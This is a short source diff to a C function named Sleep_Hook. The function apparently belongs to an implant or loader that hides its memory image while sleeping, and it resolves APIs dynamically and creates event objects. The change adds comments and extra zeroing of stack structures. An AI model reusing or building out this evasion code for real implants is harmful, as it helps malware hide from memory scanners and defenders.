@@ -660,6 +660,7 @@ D_SEC( D ) VOID WINAPI Sleep_Hook( _In_ DWORD DelayTime )
 			Api.RtlInitAnsiString( &Ani, C_PTR( G_SYM( "SetEvent" ) ) );
 			Api.LdrGetProcedureAddress( K32, &Ani, 0, &Api.SetEvent );
 
+			/* Get the hook length + DLL Length */
 			Tbl = C_PTR( G_SYM( Table ) );
 			Img = C_PTR( Tbl->Table->RxBuffer );
 			XLn = U_PTR( Tbl->Table->RxLength );
@@ -674,14 +675,17 @@ D_SEC( D ) VOID WINAPI Sleep_Hook( _In_ DWORD DelayTime )
 			Buf.Length = Buf.MaximumLength = Tbl->Table->ImageLength;
 
 			do {
+				/* Create synchronization event 1 */
 				if ( ! NT_SUCCESS( Api.NtCreateEvent( &Ev1, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) ) {
 					/* Abort! */
 					break;
 				};
+				/* Create synchronization event 2 */
 				if ( ! NT_SUCCESS( Api.NtCreateEvent( &Ev2, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) ) {
 					/* Abort! */
 					break;
 				};
+				/* Create synchronization event 3 */
 				if ( ! NT_SUCCESS( Api.NtCreateEvent( &Ev3, EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE ) ) ) {
 					/* Abort! */
 					break;
@@ -1053,6 +1057,10 @@ D_SEC( D ) VOID WINAPI Sleep_Hook( _In_ DWORD DelayTime )
 	/* Zero out stack structures */
 	RtlSecureZeroMemory( &Api, sizeof( Api ) );
 	RtlSecureZeroMemory( &Rnd, sizeof( Rnd ) );
+	RtlSecureZeroMemory( &Oli, sizeof( Oli ) );
+	RtlSecureZeroMemory( &Nwi, sizeof( Nwi ) );
+	RtlSecureZeroMemory( &Key, sizeof( Key ) );
+	RtlSecureZeroMemory( &Buf, sizeof( Buf ) );
 	RtlSecureZeroMemory( &Ctx, sizeof( Ctx ) );
 	RtlSecureZeroMemory( &Ani, sizeof( Ani ) );
 	RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
